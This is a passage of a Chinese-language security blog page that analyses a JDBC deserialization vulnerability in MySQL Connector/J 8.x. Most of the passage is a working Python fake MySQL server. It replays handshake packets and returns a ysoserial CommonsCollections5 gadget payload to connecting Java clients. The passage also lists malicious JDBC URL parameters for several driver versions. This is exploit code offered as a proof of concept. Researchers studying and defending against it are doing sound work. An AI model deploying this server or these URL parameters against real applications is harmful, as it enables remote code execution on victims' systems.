&quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span><br><span class="line"></span><br><span class="line"># show session status返回值构造</span><br><span class="line">part1 = &quot;0100000102&quot;</span><br><span class="line"># part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000fd0110000000&quot;</span><br><span class="line">part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000100110000000&quot;</span><br><span class="line">part3 = &quot;3c00000303646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730556616c75650556616c75650cff0000100000fd0000000000&quot;</span><br><span class="line"></span><br><span class="line"># part4就是我们想要构造部分，主要需要修改前三个字节、第5个字节以及中间的41626f727465645f636c69656e7473这个部分</span><br><span class="line"># 第五个字节表示构造字符串的长度，前三个字节表示的长度从第5个字节开始算起</span><br><span class="line">tmpPart4 = &quot;120000040f41626f727465645f636c69656e74730139&quot;</span><br><span class="line">part4 = &quot;090000&quot; + &quot;04&quot; + &quot;payload长度&quot; + &quot;payload&quot; + &quot;0139&quot;</span><br><span class="line">part5 = &quot;070000b3fe000002000000&quot;</span><br><span class="line">resPayload = part1 + part2 + part3 + part4 + part5</span><br><span class="line"></span><br><span class="line">def startServer():</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    serverSocket.bind((&quot;0.0.0.0&quot;,3306))</span><br><span class="line">    serverSocket.listen(1)</span><br><span class="line">    print(&quot;Start Fake Server:&#123;&#125;:&#123;&#125;&quot;.format(&quot;0.0.0.0&quot;,&quot;3306&quot;))</span><br><span class="line">    while True:</span><br><span class="line">        # 获取到数据之后，开始进行交互</span><br><span class="line">        conn,addr = serverSocket.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(binascii.a2b_hex(GreetingInfo))</span><br><span class="line">        while True:</span><br><span class="line">            data = conn.recv(1024)</span><br><span class="line">            print(&quot;接收到数据：&#123;&#125;&quot;.format(data))</span><br><span class="line">            # login验证</span><br><span class="line">            if b&quot;mysql_native_password&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(login1))</span><br><span class="line">            elif b&quot;auto_increment_increment&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(loginValid))</span><br><span class="line">            elif b&quot;character_set_results&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resCharset))</span><br><span class="line">            elif b&quot;session.autocommit&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resAutoCommit))</span><br><span class="line">            elif b&quot;SHOW SESSION STATUS&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resPayload))</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    startServer()</span><br></pre></td></tr></table></figure>
+
+<p>（这里有个坑，就是上面介绍<code>payload</code>前面那个字节表示<code>payload</code>的长度，如果说<code>payload</code>过长，需要两个或者多个字节来表示长度的话，就需要在前面加上一个<code>fc</code>）</p>
+<p>​    验证漏洞的话，我导入一个<code>commons-collection3.1</code>，利用<code>ysoserial</code>生成<code>payload</code>，确定长度后即可进行攻击了（这里选用了<code>CommonsCollections5</code>）：（代码有点乱，但是大致思路就是这样）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"># 对应第一个问候数据包，当监听到连接之后，发送给客户端</span><br><span class="line">GreetingInfo = &quot;4a0000000a382e302e31320013000000080c16437d1a144000ffffc00200ffc31500000000000000000000203c5f03322d4f4863566101006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="line"></span><br><span class="line">login1 = &quot;0700000200000002000000&quot;</span><br><span class="line"></span><br><span class="line"># 用户发送账号和密码后，验证成功的返回数据包</span><br><span class="line">loginValid = &quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span><br><span class="line"></span><br><span class="line">resCharset = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">resAutoCommit = &quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span><br><span class="line"></span><br><span class="line"># show session status返回值构造</span><br><span class="line">part1 = &quot;0100000102&quot;</span><br><span class="line"># part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000fd0110000000&quot;</span><br><span class="line">part2 = &quot;2a00000203646566047465737404746573740474657374046e616d65046e616d650c3f00ffff0000fc9000000000&quot;</span><br><span class="line">part3 = &quot;2c000003036465660474657374047465737404746573740576616c75650576616c75650c3f00ffff0000fc9000000000&quot;</span><br><span class="line"></span><br><span class="line"># part4就是我们想要构造部分，主要需要修改前三个字节、第5个字节以及中间的41626f727465645f636c69656e7473这个部分</span><br><span class="line"># 第五个字节表示构造字符串的长度，前三个字节表示的长度从第5个字节开始算起</span><br><span class="line">with open(&quot;poc&quot;,&quot;rb&quot;) as file:</span><br><span class="line">    payload = binascii.b2a_hex(file.read())</span><br><span class="line">tmpPart4 = &quot;120000040f41626f727465645f636c69656e74730139&quot;</span><br><span class="line"></span><br><span class="line">part4 = &quot;220800&quot; + &quot;04&quot; + &quot;fc1d08&quot; + payload.decode(&#x27;utf-8&#x27;) + &quot;0139&quot;</span><br><span class="line"></span><br><span class="line">part5 = &quot;07000005fe000022000100&quot;</span><br><span class="line">resPayload = part1 + part2 + part3 + part4 + part5</span><br><span class="line"></span><br><span class="line">final = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">warn = &quot;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&quot;</span><br><span class="line">def startServer():</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    serverSocket.bind((&quot;0.0.0.0&quot;,3306))</span><br><span class="line">    serverSocket.listen(1)</span><br><span class="line">    print(&quot;Start Fake Server:&#123;&#125;:&#123;&#125;&quot;.format(&quot;0.0.0.0&quot;,&quot;3306&quot;))</span><br><span class="line">    while True:</span><br><span class="line">        # 获取到数据之后，开始进行交互</span><br><span class="line">        conn,addr = serverSocket.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(binascii.a2b_hex(GreetingInfo))</span><br><span class="line">        while True:</span><br><span class="line">            data = conn.recv(1024)</span><br><span class="line">            print(&quot;接收到数据：&#123;&#125;&quot;.format(data))</span><br><span class="line">            # login验证</span><br><span class="line">            if b&quot;mysql_native_password&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(login1))</span><br><span class="line">            elif b&quot;auto_increment_increment&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(loginValid))</span><br><span class="line">            elif b&quot;character_set_results&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resCharset))</span><br><span class="line">            elif b&quot;session.autocommit&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resAutoCommit))</span><br><span class="line">            elif b&quot;SHOW SESSION STATUS&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resPayload))</span><br><span class="line">            elif b&quot;AUTO&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(final))</span><br><span class="line">            elif b&quot;WARNINGS&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(warn))</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    startServer()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113212542880.png" alt="image-20220113212542880"></p>
+<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>​    本文主要分析了<code>mysql8.x</code>环境下的反序列化漏洞的利用，漏洞利用点就在于<code>jdbc</code>的<code>URL</code>可控，然后我们构造<code>autoDeserialize</code>和<code>queryInterceptors</code>，让其远程连接<code>Fake Mysql</code>，最终触发了反序列化。本文用到的<code>URL</code>为：<code>jdbc:mysql://127.0.0.1:3306/test?useSSL=false&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;serverTimezone=UTC</code>。这里设置<code>useSSL=false</code>主要是为了方便抓取<code>mysql</code>数据包进行分析。</p>
+<p>​    当然，在不同的<code>mysql</code>版本下，利用的方式稍微有一点点不同，但是大致原理是类似，这里就不再进行分析了。下面贴一个不同版本下<code>jdbc</code>反序列化漏洞的利用方式：（有兴趣的师傅自己研究吧）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 6.x版本下需要设置的参数</span><br><span class="line">autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br><span class="line"></span><br><span class="line"># 5.1.11及以上的5.x版本</span><br><span class="line">autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br><span class="line"></span><br><span class="line"># 5.1.29-5.1.40</span><br><span class="line">detectCustomCollations=true&amp;autoDeserialize=true</span><br><span class="line"></span><br><span class="line"># 5.1.28-5.1.19</span><br><span class="line">autoDeserialize=true</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、参考文章"><a href="#六、参考文章" class="headerlink" title="六、参考文章"></a>六、参考文章</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&POC%E7%BC%96%E5%86%99/" data-id="cl8h1i72n00090bdp1znc71ok" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          RWCTF 4th Desperate Cat 赛题学习与复现
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">HXP CTF 2021文件包含到RCE技巧学习</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">RWCTF 4th Desperate Cat 赛题学习与复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
